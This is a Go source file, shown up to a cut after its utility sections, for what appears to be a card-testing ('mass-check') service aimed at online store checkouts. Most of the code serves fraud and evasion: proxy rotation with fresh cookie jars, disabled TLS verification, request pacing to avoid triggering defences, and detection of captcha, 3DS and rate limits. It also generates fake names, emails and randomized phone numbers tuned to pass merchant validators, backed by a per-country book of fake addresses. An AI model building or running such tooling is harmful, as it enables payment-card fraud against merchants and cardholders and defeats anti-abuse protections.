package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

// ==========================================
// CONFIGURATION
// ==========================================

const (
	// Capped for a 2GB box: 1500/500 in-flight GraphQL checks ballooned to
	// 471MB RSS and got OOM-killed mid-mass-check. 120/60 keeps RSS <150MB.
	PER_USER_CONCURRENT   = 60
	GLOBAL_MAX_CONCURRENT = 120
	MAX_POLL_ATTEMPTS     = 8
	POLL_INITIAL_DELAY    = 600 * time.Millisecond
	POLL_MAX_DELAY        = 1200 * time.Millisecond
	POLL_STEP             = 200 * time.Millisecond
	PORT_DEFAULT          = "5001"
	VARIANT_CACHE_TTL     = 10 * time.Minute
	TOKEN_CACHE_TTL       = 30 * time.Minute
	CTX_TIMEOUT           = 90 * time.Second
	HTTP_TIMEOUT          = 45 * time.Second
)

var C2C = map[string]string{
	"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB",
	"CHF": "CH", "EUR": "DE", "AUD": "AU", "NZD": "NZ", "JPY": "JP", "SGD": "SG",
	"SEK": "SE", "NOK": "NO", "DKK": "DK", "PLN": "PL", "CZK": "CZ", "MXN": "MX",
	"BRL": "BR", "KRW": "KR", "THB": "TH", "MYR": "MY", "PHP": "PH", "IDR": "ID",
	"TWD": "TW", "ZAR": "ZA", "ILS": "IL", "TRY": "TR", "SAR": "SA", "QAR": "QA",
	"KWD": "KW", "CNY": "CN", "HUF": "HU", "RON": "RO", "BGN": "BG", "CLP": "CL",
	"COP": "CO", "PEN": "PE", "ARS": "AR",
}

type Address struct {
	Address1, City, PostalCode, ZoneCode, CountryCode, Phone string
}

// dialCodes for E.164 phone normalization — strict stores reject local-format
// numbers (DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN).
var dialCodes = map[string]string{
	"US": "1", "CA": "1", "GB": "44", "IN": "91", "AE": "971", "HK": "852",
	"CN": "86", "CH": "41", "AU": "61", "DE": "49", "NZ": "64", "JP": "81",
	"SG": "65", "SE": "46", "NO": "47", "DK": "45", "FR": "33", "MX": "52",
	"BR": "55", "IE": "353", "IT": "39", "ES": "34", "NL": "31", "BE": "32",
	"AT": "43", "PL": "48", "CZ": "420", "PT": "351", "GR": "30", "KR": "82",
	"TW": "886", "TH": "66", "MY": "60", "PH": "63", "ID": "62", "ZA": "27",
	"IL": "972", "TR": "90", "SA": "966", "AR": "54", "CL": "56", "CO": "57",
	"PE": "51", "RU": "7", "UA": "380",
}

// mobilePrefixes: valid FIRST national digit band per country (strict
// libphonenumber-validity stores refuse wrong leading digits, e.g. HK
// mobiles must start 5-9, GB mobiles 7, AU mobiles 4).
var mobilePrefixes = map[string][2]int{
	"US": {2, 9}, "CA": {2, 9}, "GB": {7, 7}, "IN": {6, 9}, "HK": {5, 9},
	"SG": {8, 9}, "AU": {4, 4}, "DE": {1, 5}, "FR": {6, 7}, "JP": {7, 9},
	"MX": {5, 5}, "NZ": {2, 2}, "IT": {3, 3}, "ES": {6, 7}, "NL": {6, 6},
	"BE": {4, 4}, "AT": {6, 6}, "PL": {5, 5}, "CZ": {6, 7}, "PT": {9, 9},
	"GR": {6, 6}, "KR": {1, 1}, "TW": {9, 9}, "TH": {6, 8}, "MY": {1, 1},
	"PH": {9, 9}, "ID": {8, 8}, "ZA": {6, 8}, "IL": {5, 5}, "TR": {5, 5},
	"SA": {5, 5}, "AR": {9, 9}, "CL": {9, 9}, "CO": {3, 3}, "PE": {9, 9},
	"RU": {9, 9}, "UA": {6, 9}, "CN": {1, 1}, "CH": {7, 7}, "AE": {5, 5},
	"SE": {7, 7}, "NO": {4, 9}, "DK": {2, 9}, "IE": {8, 8},
}

// nationalLengths: national significant digits per country. Preferred over
// Book-derived length when present.
var nationalLengths = map[string]int{
	"US": 10, "CA": 10, "GB": 10, "IN": 10, "HK": 8, "SG": 8, "AU": 9,
	"DE": 10, "FR": 9, "JP": 10, "MX": 10, "NZ": 9, "IT": 10, "ES": 9,
	"NL": 9, "BE": 9, "AT": 10, "PL": 9, "CZ": 9, "PT": 9, "GR": 10,
	"KR": 10, "TW": 9, "TH": 9, "MY": 9, "PH": 10, "ID": 10, "ZA": 9,
	"IL": 9, "TR": 10, "SA": 9, "AR": 10, "CL": 9, "CO": 10, "PE": 9,
	"RU": 10, "UA": 9, "CN": 11, "CH": 9, "AE": 9, "SE": 9, "NO": 8,
	"DK": 8, "IE": 9, "BR": 11,
}

// randNationalDigits returns n random digits honoring the country's mobile
// first-digit band (falls back to 2-9) plus the plausibility filter.
func randNationalDigits(n int, country string) string {
	lo, hi := 2, 9
	if band, ok := mobilePrefixes[country]; ok {
		lo, hi = band[0], band[1]
	}
	gen := ""
	for t := 0; t < 25; t++ {
		gen = ""
		for i := 0; i < n; i++ {
			var d int
			if i == 0 {
				// First digit: country mobile band (GB 7, AU 4, HK 5-9…).
				d = lo
				if hi > lo {
					d += rand.Intn(hi - lo + 1)
				}
				if d < 2 || d > 9 {
					d = 2 + rand.Intn(8)
				}
			} else {
				d = rand.Intn(10)
			}
			gen += string(rune('0' + d))
		}
		if plausibleNationalNumber(gen, country) {
			break
		}
	}
	return gen
}

// randomizedPhones builds per-check phone renderings from the Book entry:
// same country dial + digit count, randomized subscriber digits (first 2-9)
// so fake-obvious numbers (55555555, 9876543210) don't trip validators.
// Returns (e164, local, raw). Empty e164 = fall back to Book normalize.
func randomizedPhones(addr Address) (string, string, string) {
	dial, ok := dialCodes[addr.CountryCode]
	if !ok || dial == "" {
		return "", "", ""
	}
	bookDigits := ""
	for _, r := range addr.Phone {
		if r >= '0' && r <= '9' {
			bookDigits += string(r)
		}
	}
	n := len(bookDigits) - len(dial)
	if strings.HasPrefix(bookDigits, dial) && n > 0 {
		// strip dial if embedded
	} else {
		n = len(bookDigits)
	}
	if n <= 0 {
		return "", "", ""
	}
	if nl, ok := nationalLengths[addr.CountryCode]; ok && nl > 0 {
		n = nl
	}
	gen := randNationalDigits(n, addr.CountryCode)
	return "+" + dial + gen, gen, "+" + dial + " " + gen
}

// plausibleNationalNumber rejects obviously-fake digit strings that strict
// validators (libphonenumber validity, repeated/sequential checks) refuse:
// NANP N11 rules for US/CA, 4+ repeats or 5+ runs anywhere.
func plausibleNationalNumber(digits, country string) bool {
	if digits == "" {
		return false
	}
	for _, r := range digits {
		if r < '0' || r > '9' {
			return false
		}
	}
	run, up, down := 1, 1, 1
	for i := 1; i < len(digits); i++ {
		if digits[i] == digits[i-1] {
			run++
			if run >= 4 {
				return false
			}
		} else {
			run = 1
		}
		if digits[i] == digits[i-1]+1 {
			up++
			if up >= 5 {
				return false
			}
		} else {
			up = 1
		}
		if digits[i] == digits[i-1]-1 {
			down++
			if down >= 5 {
				return false
			}
		} else {
			down = 1
		}
	}
	if (country == "US" || country == "CA") && len(digits) == 10 {
		area, exch := digits[0:3], digits[3:6]
		if area[0] < '2' || area[1:3] == "11" || exch[0] < '2' || exch[1:3] == "11" {
			return false
		}
	}
	return true
}
func normalizePhone(raw, countryCode string) string {
	digits := ""
	for _, r := range raw {
		if r >= '0' && r <= '9' {
			digits += string(r)
		}
	}
	if digits == "" {
		return raw
	}
	if strings.HasPrefix(strings.TrimSpace(raw), "+") {
		return "+" + digits
	}
	if d, ok := dialCodes[countryCode]; ok {
		return "+" + d + digits
	}
	return "+" + digits
}

var Book = map[string]Address{
	"US":      {"123 Main", "New York", "10080", "NY", "US", "2194157586"},
	"CA":      {"88 Queen", "Toronto", "M5J2J3", "ON", "CA", "4165550198"},
	"GB":      {"221B Baker Street", "London", "NW1 6XE", "LND", "GB", "2079460123"},
	"IN":      {"221B MG", "Mumbai", "400001", "MH", "IN", "+91 9876543210"},
	"AE":      {"Burj Tower", "Dubai", "", "DU", "AE", "+971 50 123 4567"},
	"HK":      {"Nathan 88", "Kowloon", "", "KL", "HK", "+852 5555 5555"},
	"CN":      {"8 Zhongguancun Street", "Beijing", "100080", "BJ", "CN", "1062512345"},
	"CH":      {"Gotthardstrasse 17", "Schweiz", "6430", "SZ", "CH", "445512345"},
	"AU":      {"1 Martin Place", "Sydney", "2000", "NSW", "AU", "291234567"},
	"DE":      {"Friedrichstr 100", "Berlin", "10117", "BE", "DE", "3012345678"},
	"NZ":      {"1 Queen Street", "Auckland", "1010", "AUK", "NZ", "91234567"},
	"JP":      {"1-1 Marunouchi", "Tokyo", "100-0005", "JP-13", "JP", "312345678"},
	"SG":      {"1 Raffles Place", "Singapore", "048616", "", "SG", "61234567"},
	"SE":      {"Drottninggatan 1", "Stockholm", "11151", "", "SE", "812345678"},
	"NO":      {"Karl Johans gate 1", "Oslo", "0154", "", "NO", "21234567"},
	"DK":      {"Stroget 1", "Copenhagen", "1000", "", "DK", "31234567"},
	"FR":      {"1 Rue de Rivoli", "Paris", "75001", "", "FR", "142345678"},
	"MX":      {"Reforma 222", "Mexico City", "06600", "CDMX", "MX", "5512345678"},
	"BR":      {"Av Paulista 1000", "Sao Paulo", "01310-100", "SP", "BR", "1112345678"},
	"IE":      {"1 OConnell Street", "Dublin", "D01 F5P2", "L", "IE", "3531234567"},
	"IT":      {"Via Roma 1", "Rome", "00187", "RM", "IT", "39061234567"},
	"ES":      {"Calle Mayor 1", "Madrid", "28013", "MD", "ES", "34912345678"},
	"NL":      {"Damrak 1", "Amsterdam", "1012 LG", "NH", "NL", "31201234567"},
	"BE":      {"Rue Neuve 1", "Brussels", "1000", "BRU", "BE", "3221234567"},
	"AT":      {"Karntner Strasse 1", "Vienna", "1010", "WI", "AT", "4311234567"},
	"PL":      {"Nowy Swiat 1", "Warsaw", "00-001", "MZ", "PL", "48221234567"},
	"CZ":      {"Wenceslas Square 1", "Prague", "110 00", "PR", "CZ", "42021234567"},
	"PT":      {"Avenida da Liberdade 1", "Lisbon", "1250-096", "LI", "PT", "35121234567"},
	"GR":      {"Ermou 1", "Athens", "105 63", "AT", "GR", "30211234567"},
	"KR":      {"Gangnam-daero 1", "Seoul", "06000", "11", "KR", "82212345678"},
	"TW":      {"Zhongxiao East Road 1", "Taipei", "100", "TPE", "TW", "88621234567"},
	"TH":      {"Sukhumvit Road 1", "Bangkok", "10110", "10", "TH", "6621234567"},
	"MY":      {"Jalan Bukit Bintang 1", "Kuala Lumpur", "55100", "14", "MY", "60312345678"},
	"PH":      {"Ayala Avenue 1", "Manila", "1226", "NCR", "PH", "+6321234567"},
	"ID":      {"Jalan Sudirman 1", "Jakarta", "10220", "JK", "ID", "6221234567"},
	"ZA":      {"Long Street 1", "Cape Town", "8001", "WC", "ZA", "27212345678"},
	"IL":      {"Rothschild Boulevard 1", "Tel Aviv", "6688101", "TA", "IL", "9721234567"},
	"TR":      {"Istiklal Caddesi 1", "Istanbul", "34435", "34", "TR", "902121234567"},
	"SA":      {"King Fahd Road 1", "Riyadh", "12211", "01", "SA", "966112345678"},
	"AR":      {"Avenida Corrientes 1", "Buenos Aires", "C1043", "C", "AR", "541112345678"},
	"CL":      {"Avenida Providencia 1", "Santiago", "7500000", "RM", "CL", "56221234567"},
	"CO":      {"Carrera 7 1", "Bogota", "110111", "DC", "CO", "5711234567"},
	"PE":      {"Avenida Arequipa 1", "Lima", "15046", "LIM", "PE", "5111234567"},
	"RU":      {"Tverskaya Street 1", "Moscow", "125009", "MOW", "RU", "74951234567"},
	"UA":      {"Khreshchatyk 1", "Kyiv", "01001", "30", "UA", "380441234567"},
	"DEFAULT": {"123 Main", "New York", "10080", "NY", "US", "2194157586"},
}

// pickAddrByURL: secondary fallback. Two-part TLD check first.
func pickAddrByURL(siteURL string) Address {
	u, err := url.Parse(normalizeDomain(siteURL))
	if err == nil {
		host := strings.ToUpper(u.Hostname())
		parts := strings.Split(host, ".")

		twoPartMap := map[string]string{
			"CO.UK": "GB", "COM.AU": "AU", "CO.NZ": "NZ",
			"CO.IN": "IN", "CO.JP": "JP", "COM.BR": "BR",
			"CO.ZA": "ZA", "COM.MX": "MX", "COM.AR": "AR",
		}
		if len(parts) >= 2 {
			two := parts[len(parts)-2] + "." + parts[len(parts)-1]
			if cc, ok := twoPartMap[two]; ok {
				if addr, ok := Book[cc]; ok {
					return addr
				}
			}
		}

		if len(parts) > 0 {
			tld := parts[len(parts)-1]
			if addr, ok := Book[tld]; ok {
				return addr
			}
		}
	}
	return Book["DEFAULT"]
}

// pickAddrByCurrency: primary address selection after variant fetch.
// Returns Address plus an "ok" flag indicating a real currency→country mapping hit.
func pickAddrByCurrency(currency string) (Address, bool) {
	cc, ok := C2C[strings.ToUpper(strings.TrimSpace(currency))]
	if !ok {
		return Book["DEFAULT"], false
	}
	if addr, ok := Book[cc]; ok {
		return addr, true
	}
	return Book["DEFAULT"], false
}

// ==========================================
// METRICS (ATOMIC)
// ==========================================

type Metrics struct {
	TotalChecks     int64
	TotalSuccess    int64
	TotalFailed     int64
	ActiveChecks    int64
	RateLimited     int64
	CaptchaBlocked  int64
	ThreeDSCount    int64
	StillProcessing int64
	CacheHits       int64
	CacheMisses     int64
	CartCreateFails int64
	PCIFails        int64
	SubmitFails     int64
}

var metrics Metrics
var startTime = time.Now()

// Per-code counters for the /metrics endpoint (error taxonomy observability).
var errorCodeCounters sync.Map

func incErrorCode(code string) {
	if code == "" {
		code = "UNKNOWN"
	}
	v, _ := errorCodeCounters.LoadOrStore(code, new(int64))
	atomic.AddInt64(v.(*int64), 1)
}

func snapshotErrorCodes() map[string]int64 {
	out := map[string]int64{}
	errorCodeCounters.Range(func(k, v interface{}) bool {
		out[k.(string)] = atomic.LoadInt64(v.(*int64))
		return true
	})
	return out
}

// Gentle-traffic pacing (ported from the minimal Python engine that charges
// with fewer defenses triggered): stagger checkout starts >=50ms apart and
// pause briefly between stages so bursts don't look like a hammer.
var startGateMu sync.Mutex
var lastStartUnixNano int64

func admitStart() {
	startGateMu.Lock()
	defer startGateMu.Unlock()
	now := time.Now().UnixNano()
	if wait := int64(50*time.Millisecond) - (now - atomic.LoadInt64(&lastStartUnixNano)); wait > 0 {
		time.Sleep(time.Duration(wait))
		now = time.Now().UnixNano()
	}
	atomic.StoreInt64(&lastStartUnixNano, now)
}

func paceStep() {
	time.Sleep(time.Duration(50+rand.Intn(100)) * time.Millisecond)
}

// ==========================================
// CACHES
// ==========================================

type variantEntry struct {
	ID               string
	Price            float64
	Currency         string
	RequiresShipping bool
	Expiry           time.Time
}

type tokenEntry struct {
	Token  string
	Expiry time.Time
}

type deadEntry struct {
	Reason string
	Expiry time.Time
}

var (
	variantCache sync.Map // baseURL -> variantEntry
	tokenCache   sync.Map // baseURL -> tokenEntry
	deadStores   sync.Map // baseURL -> deadEntry
	variantMiss  sync.Map // baseURL -> time.Time (negative cache: no paid variant)
)

const VARIANT_MISS_TTL = 60 * time.Second

func cacheLookupVariant(baseURL string) (string, float64, string, bool, bool) {
	v, ok := variantCache.Load(baseURL)
	if !ok {
		return "", 0, "", false, false
	}
	e := v.(variantEntry)
	if time.Now().After(e.Expiry) {
		variantCache.Delete(baseURL)
		return "", 0, "", false, false
	}
	return e.ID, e.Price, e.Currency, e.RequiresShipping, true
}

func cacheStoreVariant(baseURL, id string, price float64, currency string, requiresShipping bool) {
	variantCache.Store(baseURL, variantEntry{
		ID:               id,
		Price:            price,
		Currency:         currency,
		RequiresShipping: requiresShipping,
		Expiry:           time.Now().Add(VARIANT_CACHE_TTL),
	})
}

func cacheLookupToken(baseURL string) (string, bool) {
	v, ok := tokenCache.Load(baseURL)
	if !ok {
		return "", false
	}
	e := v.(tokenEntry)
	if time.Now().After(e.Expiry) {
		tokenCache.Delete(baseURL)
		return "", false
	}
	return e.Token, true
}

func cacheStoreToken(baseURL, token string) {
	tokenCache.Store(baseURL, tokenEntry{
		Token:  token,
		Expiry: time.Now().Add(TOKEN_CACHE_TTL),
	})
}

func isDeadStore(baseURL string) (bool, string) {
	v, ok := deadStores.Load(baseURL)
	if !ok {
		return false, ""
	}
	d := v.(deadEntry)
	if time.Now().After(d.Expiry) {
		deadStores.Delete(baseURL)
		return false, ""
	}
	return true, d.Reason
}

func markDeadStore(baseURL, reason string, ttl time.Duration) {
	if baseURL == "" {
		return
	}
	deadStores.Store(baseURL, deadEntry{Reason: reason, Expiry: time.Now().Add(ttl)})
}

func clearMap(m *sync.Map) {
	m.Range(func(k, _ interface{}) bool {
		m.Delete(k)
		return true
	})
}

func mapSize(m *sync.Map) int {
	n := 0
	m.Range(func(_, _ interface{}) bool {
		n++
		return true
	})
	return n
}

// ==========================================
// HIGH-PERFORMANCE HTTP ENGINE
// ==========================================

var GlobalClient *http.Client

func init() {
	GlobalClient = &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        400,
			MaxIdleConnsPerHost: 60,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 5 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableCompression:  true,
			ForceAttemptHTTP2:   true,
		},
		Timeout: HTTP_TIMEOUT,
	}
}

// getProxyClient returns a client with a FRESH cookie jar per call to prevent
// session bleeding across concurrent goroutines. HTTP(S) proxies use
// http.Transport.Proxy; SOCKS4/5 proxies use golang.org/x/net/proxy dialer.
func getProxyClient(proxyStr string) (*http.Client, error) {
	jar, _ := cookiejar.New(nil)

	if proxyStr == "" {
		return &http.Client{
			Jar:       jar,
			Transport: GlobalClient.Transport,
			Timeout:   HTTP_TIMEOUT,
		}, nil
	}

	proxyURL, err := parseProxy(proxyStr)
	if err != nil || proxyURL == nil {
		return nil, fmt.Errorf("invalid proxy format")
	}

	scheme := strings.ToLower(proxyURL.Scheme)

	if scheme == "socks5" || scheme == "socks4" || scheme == "socks" {
		var auth *proxy.Auth
		if proxyURL.User != nil {
			password, _ := proxyURL.User.Password()
			auth = &proxy.Auth{
				User:     proxyURL.User.Username(),
				Password: password,
			}
		}
		host := proxyURL.Host
		dialer, err := proxy.SOCKS5("tcp", host, auth, proxy.Direct)
		if err != nil {
			return nil, fmt.Errorf("socks5 dialer error: %v", err)
		}
		transport := &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dialer.Dial(network, addr)
			},
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true,
		}
		return &http.Client{
			Jar:       jar,
			Transport: transport,
			Timeout:   HTTP_TIMEOUT,
		}, nil
	}

	return &http.Client{
		Jar: jar,
		Transport: &http.Transport{
			Proxy:               http.ProxyURL(proxyURL),
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     30 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableCompression:  true,
		},
		Timeout: HTTP_TIMEOUT,
	}, nil
}

func parseProxy(raw string) (*url.URL, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil, nil
	}
	lower := strings.ToLower(raw)
	scheme := "http"
	for _, prefix := range []string{"socks5h://", "socks5://", "socks4a://", "socks4://", "socks://", "https://", "http://"} {
		if strings.HasPrefix(lower, prefix) {
			scheme = strings.TrimRight(prefix, ":/")
			scheme = strings.Replace(scheme, "socks5h", "socks5", 1)
			scheme = strings.Replace(scheme, "socks4a", "socks4", 1)
			if scheme == "socks" {
				scheme = "socks5"
			}
			raw = raw[len(prefix):]
			break
		}
	}
	if !strings.Contains(raw, "://") {
		// No scheme-authority yet: split credentials manually, then build
		// via net/url so special chars in user/pass (% { } $ & @ :) are
		// properly escaped instead of breaking url.Parse.
		var user, pass, hostport string
		rest := raw
		if at := strings.LastIndex(rest, "@"); at != -1 {
			// Already userinfo@host form (no scheme): split on LAST @ so
			// passwords containing @ survive; user/pass on FIRST colon.
			var creds string
			creds, hostport = rest[:at], rest[at+1:]
			if ci := strings.Index(creds, ":"); ci != -1 {
				user, pass = creds[:ci], creds[ci+1:]
			} else {
				user = creds
			}
			return buildProxyURL(scheme, user, pass, hostport)
		}
		if fields := strings.Fields(rest); len(fields) == 4 {
			// Space-separated formats: "user pass host port" (bot DB
			// format) or "host port user pass".
			if _, err := strconv.Atoi(fields[3]); err == nil {
				user, pass, hostport = fields[0], fields[1], fields[2]+":"+fields[3]
			} else if _, err := strconv.Atoi(fields[1]); err == nil {
				user, pass, hostport = fields[2], fields[3], fields[0]+":"+fields[1]
			} else {
				user, pass, hostport = fields[0], fields[1], fields[2]+":"+fields[3]
			}
			return buildProxyURL(scheme, user, pass, hostport)
		} else if fields := strings.Fields(rest); len(fields) == 2 {
			return buildProxyURL(scheme, "", "", fields[0]+":"+fields[1])
		}
		parts := strings.Split(rest, ":")
		switch len(parts) {
		case 2:
			return buildProxyURL(scheme, "", "", rest)
		case 4:
			if _, err := strconv.Atoi(parts[1]); err == nil {
				return buildProxyURL(scheme, parts[2], parts[3], parts[0]+":"+parts[1])
			}
			return buildProxyURL(scheme, parts[0], parts[1], parts[2]+":"+parts[3])
		default:
			return buildProxyURL(scheme, "", "", rest)
		}
	}
	// Scheme-authority form (bot sends normalized http://user:pass@host:port):
	// split userinfo on LAST @ / FIRST : manually for the same escaping
	// reason, then rebuild. Falls back to plain parse when no userinfo.
	rest := raw[strings.Index(raw, "://")+3:]
	if at := strings.LastIndex(rest, "@"); at != -1 {
		var user, pass string
		creds, hostport := rest[:at], rest[at+1:]
		if ci := strings.Index(creds, ":"); ci != -1 {
			user, pass = creds[:ci], creds[ci+1:]
		} else {
			user = creds
		}
		return buildProxyURL(scheme, user, pass, hostport)
	}
	return url.Parse(raw)
}

// buildProxyURL constructs the proxy URL via net/url so credentials with
// special characters are escaped (url.UserPassword handles % & $ { } @ :).
func buildProxyURL(scheme, user, pass, hostport string) (*url.URL, error) {
	hostport = strings.TrimSpace(hostport)
	if hostport == "" {
		return nil, fmt.Errorf("invalid proxy format")
	}
	u := &url.URL{Scheme: scheme, Host: hostport}
	if user != "" {
		u.User = url.UserPassword(user, pass)
	}
	return u, nil
}

func doReq(ctx context.Context, client *http.Client, method, reqURL string, headers map[string]string, body io.Reader) ([]byte, int, error) {
	req, err := http.NewRequestWithContext(ctx, method, reqURL, body)
	if err != nil {
		return nil, 0, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	return data, resp.StatusCode, err
}

func doReqFull(ctx context.Context, client *http.Client, method, reqURL string, headers map[string]string, body io.Reader) ([]byte, int, http.Header, error) {
	req, err := http.NewRequestWithContext(ctx, method, reqURL, body)
	if err != nil {
		return nil, 0, nil, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, nil, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	return data, resp.StatusCode, resp.Header, err
}

// ==========================================
// ZERO-ALLOCATION FAST JSON EXTRACTOR
// ==========================================

func fastExtract(data []byte, key string) []byte {
	search := []byte(`"` + key + `":`)
	idx := bytes.Index(data, search)
	if idx == -1 {
		return nil
	}
	start := idx + len(search)
	for start < len(data) && (data[start] == ' ' || data[start] == '\t' || data[start] == '\n' || data[start] == '\r') {
		start++
	}
	if start >= len(data) {
		return nil
	}
	if data[start] == '"' {
		end := start + 1
		for end < len(data) {
			if data[end] == '\\' {
				end += 2
				continue
			}
			if data[end] == '"' {
				return data[start+1 : end]
			}
			end++
		}
	} else if data[start] == '{' || data[start] == '[' {
		bracket := data[start]
		closeBracket := byte('}')
		if bracket == '[' {
			closeBracket = ']'
		}
		depth := 1
		end := start + 1
		for end < len(data) && depth > 0 {
			if data[end] == '"' {
				end++
				for end < len(data) && data[end] != '"' {
					if data[end] == '\\' {
						end++
					}
					end++
				}
			} else if data[end] == bracket {
				depth++
			} else if data[end] == closeBracket {
				depth--
			}
			end++
		}
		return data[start:end]
	} else {
		end := start
		for end < len(data) && data[end] != ',' && data[end] != '}' && data[end] != ']' {
			end++
		}
		return bytes.TrimSpace(data[start:end])
	}
	return nil
}

func fstr(data []byte, key string) string { return string(fastExtract(data, key)) }

// lastStr returns the value of the LAST `"key":"value"` occurrence.
// Use for __typename: nested objects serialize first, so the outer object's
// own type tag is the last one. fstr (first match) returns a nested type
// like "Proposal" instead of "SubmitRejected".
func lastStr(data []byte, key string) string {
	search := []byte(`"` + key + `":`)
	idx := bytes.LastIndex(data, search)
	if idx == -1 {
		return ""
	}
	rest := data[idx+len(search):]
	rest = bytes.TrimLeft(rest, " \t\n\r")
	if len(rest) < 2 || rest[0] != '"' {
		return ""
	}
	end := 1
	for end < len(rest) {
		if rest[end] == '\\' {
			end += 2
			continue
		}
		if rest[end] == '"' {
			return string(rest[1:end])
		}
		end++
	}
	return ""
}

// ==========================================
// UTILITIES
// ==========================================

var reUUID = regexp.MustCompile(`[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`)

func extractBetween(text, start, end string) string {
	i := strings.Index(text, start)
	if i == -1 {
		return ""
	}
	i += len(start)
	j := strings.Index(text[i:], end)
	if j == -1 {
		return ""
	}
	return text[i : i+j]
}

func unescapeHTML(text string) string {
	r := strings.NewReplacer(
		"&quot;", `"`, "&#34;", `"`, "\u0022", `"`,
		"&#39;", `'`, "\u0027", `'`, "&amp;", `&`,
		`\\"`, `"`,
	)
	return r.Replace(text)
}

// extractStableID: no random UUID fallback — falls back to variant-<id>-1
// so proposal/submit stableId always matches the merchandise line.
func extractStableID(text, variantID string) string {
	raw := unescapeHTML(text)
	val := extractBetween(raw, `"stableId":"`, `"`)
	if val != "" {
		return val
	}
	if match := reUUID.FindString(raw); match != "" {
		return match
	}
	if variantID == "" {
		variantID = "unknown"
	}
	return fmt.Sprintf("variant-%s-1", variantID)
}

func getRandName() (string, string) {
	f := []string{"James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"}
	l := []string{"Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"}
	return f[rand.Intn(len(f))], l[rand.Intn(len(l))]
}

func genEmail(first, last string) string {
	d := []string{"gmail.com", "yahoo.com", "outlook.com", "protonmail.com"}
	return fmt.Sprintf("%s.%s%d@%s", strings.ToLower(first), strings.ToLower(last), rand.Intn(9900)+100, d[rand.Intn(len(d))])
}

func getRandStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func normalizeDomain(d string) string {
	if !strings.HasPrefix(d, "http") {
		d = "https://" + d
	}
	return strings.TrimSuffix(d, "/")
}

func extractCleanResponse(msg string) string {
	if msg == "" {
		return "UNKNOWN_ERROR"
	}
	upper := strings.ToUpper(msg)
	// Any captcha-family signal normalizes to CAPTCHA_REQUIRED so the store
	// is never dead-marked and the bot applies proxy cooldown (no poisoning).
	if strings.Contains(upper, "CAPTCHA") {
		return "CAPTCHA_REQUIRED"
	}
	dsIndicators := []string{"3DS_REQUIRED", "OTP", "SCA_REQUIRED", "AUTHENTICATION_REQUIRED", "THREE_D_SECURE", "OTP_REQUIRED", "THREE_DS_REDIRECT", "PAYMENTS_THREE_D_SECURE_REQUIRED"}
	for _, ind := range dsIndicators {
		if strings.Contains(upper, ind) {
			return "3DS_REQUIRED"
		}
	}
	re := regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`)
	if m := re.FindStringSubmatch(msg); len(m) > 1 {
		return m[1]
	}
	msg = strings.TrimSpace(msg)
	if regexp.MustCompile(`^[A-Z][A-Z0-9_]+$`).MatchString(msg) {
		return msg
	}
	if len(msg) > 80 {
		return msg[:80]
	}
	return msg
}

func nonJSONResponseCode(status int, body []byte) string {
	text := strings.TrimSpace(string(body))
	if status == 429 || status == 430 || status == 503 {
		return "RATE_LIMITED"
	}
	if text == "" {
		return "RATE_LIMITED"
	}
	low := strings.ToLower(text[:minInt(300, len(text))])
	if strings.HasPrefix(low, "<!") || strings.HasPrefix(low, "<html") || strings.Contains(low, "<html") {
		if strings.Contains(low, "captcha") || strings.Contains(low, "challenge") || strings.Contains(low, "bot") {
			return "CAPTCHA_REQUIRED"
		}
		return "RATE_LIMITED"
	}
	if strings.Contains(low, "throttl") || strings.Contains(low, "too many") || strings.Contains(low, "rate limit") {
		return "RATE_LIMITED"
	}
	return "UNPARSEABLE_RESPONSE"
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func isCaptchaRequired(body []byte) bool {
	upper := strings.ToUpper(string(body))
	return strings.Contains(upper, "CAPTCHA_REQUIRED") || strings.Contains(upper, "HCAPTCHA") || strings.Contains(upper, "H-CAPTCHA")
}

func rejectNeedsTermAccept(codes []string) bool {
	for _, c := range codes {
		cu := strings.ToUpper(c)
		if strings.Contains(cu, "TAX_NEW_TAX") || strings.HasPrefix(cu, "DELIVERY") ||
			cu == "WAITING_PENDING_TERMS" || cu == "ORDER_TOTAL_CHANGED" ||
			cu == "PAYMENT_AMOUNT_CHANGED" || strings.Contains(cu, "MUST_BE_ACCEPTED") ||
			strings.Contains(cu, "DETAIL_CHANGED") || strings.Contains(cu, "INCLUSIVITY") ||
			strings.Contains(cu, "TERMS_CHANGED") || cu == "PAYMENTS_METHOD" {
			return true
		}
	}
	return false
}

// ==========================================
// AUTO VARIANT FETCHER
// ==========================================

